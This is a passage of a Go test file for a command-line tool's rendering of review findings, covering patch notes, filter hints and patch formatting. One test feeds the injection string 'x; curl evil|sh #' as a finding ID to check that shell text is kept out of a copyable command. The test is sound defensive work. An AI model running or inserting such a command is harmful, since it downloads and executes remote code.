		altered := trailReviewDetailFixture()
		altered.SuggestedChanges[0].Patch = trailReviewStrPtr(patch)
		plain, styled := render(altered)
		for name, out := range map[string]string{"plain": plain, "styled": styled} {
			for _, want := range []string{note, "\n    entire trail finding show 01M63Q23WNMWAAAAAAAAAAAAAA --json\n"} {
				if !strings.Contains(out, want) {
					t.Fatalf("%s view of patch %q missing %q:\n%s", name, patch, want, out)
				}
			}
		}
	}
}

// Before sanitizing, plain `finding show` printed a non-empty body trimmed,
// even one of only whitespace; that output must not change.
func TestPrintTrailReviewCommentDetail_WhitespaceBodyPlainGolden(t *testing.T) {
	t.Parallel()
	_, comments := trailReviewRenderFixture()
	comment := comments[2]
	comment.Body = trailReviewStrPtr("   ")
	var out strings.Builder
	printTrailReviewCommentDetail(&out, comment)
	assertTrailReviewGolden(t, out.String(), `Finding:   01M63Q20JXB9CCCCCCCCCCCCCC
Status:    resolved
Freshness: current
Severity:  low
Location: whole_change


`)
}

// The note's command is copied and run, so a server ID carrying shell text
// never reaches it.
func TestTrailReviewPatchAlteredNoteKeepsShellTextOut(t *testing.T) {
	t.Parallel()
	if _, cmd := trailReviewPatchAlteredNote("01M63Q23WNMWAAAAAAAAAAAAAA"); cmd != "entire trail finding show 01M63Q23WNMWAAAAAAAAAAAAAA --json" {
		t.Fatalf("plain ID command = %q", cmd)
	}
	if _, cmd := trailReviewPatchAlteredNote("x; curl evil|sh #"); cmd != "entire trail finding show <finding-id> --json" {
		t.Fatalf("hostile ID command = %q", cmd)
	}
}

// Styled patches keep tabs and CRLF line ends on colored lines, so a copied
// tab-indented patch still applies.
func TestRenderPatchKeepsTabsAndCarriageReturns(t *testing.T) {
	t.Parallel()
	got := tuiutil.StripANSI(colorTrailReviewStyles().renderPatch("@@ -1,2 +1,2 @@\n \tkeep\n-\told\r\n+\tnew"))
	if want := "@@ -1,2 +1,2 @@\n \tkeep\n-\told\r\n+\tnew\n"; got != want {
		t.Fatalf("renderPatch = %q, want %q", got, want)
	}
}

func TestTrailReviewHiddenOpenNoteNamesEveryActiveFilter(t *testing.T) {
	t.Parallel()
	opts := defaultTrailReviewListOptions()
	opts.Severity = "high"
	hidden := trailReviewOpenOutside{hidden: 2, hiddenStale: true}
	if got := trailReviewHiddenOpenNote(hidden, opts); !strings.HasSuffix(got, "— add --freshness any or drop --severity") {
		t.Fatalf("hint = %q", got)
	}
	// Freshness is named only when a hidden finding is stale.
	if got := trailReviewHiddenOpenNote(trailReviewOpenOutside{hidden: 2}, opts); !strings.HasSuffix(got, "— drop --severity") {
		t.Fatalf("current-only hint = %q", got)
	}
	opts.Freshness = trailReviewFreshnessAny
	if got := trailReviewHiddenOpenNote(hidden, opts); !strings.HasSuffix(got, "— drop --severity") {
		t.Fatalf("severity-only hint = %q", got)
	}
}

// `finding list` names open findings its filters hide; it has no stale
// section, so stale ones point at --freshness.
func TestTrailReviewListHiddenNote(t *testing.T) {
	t.Parallel()
	_, comments := trailReviewRenderFixture()
	counts := countTrailReviewComments(comments)
	opts := defaultTrailReviewListOptions()
	if got, want := trailReviewListHiddenNote(counts, comments[:1], opts), "+1 open finding not shown by the current filters — add --freshness any"; got != want {
		t.Fatalf("note = %q, want %q", got, want)
	}
	if got := trailReviewListHiddenNote(counts, comments[:2], opts); got != "" {
		t.Fatalf("every open finding shown, note = %q", got)
	}
	if trailReviewListChecksHidden(opts, "next-1") {
		t.Fatal("a paged list cannot tell hidden findings from later pages")
	}
	opts.Status = trailReviewStatusResolved
	if trailReviewListChecksHidden(opts, "") {
		t.Fatal("a list that excludes open findings has none to hide")
	}
}
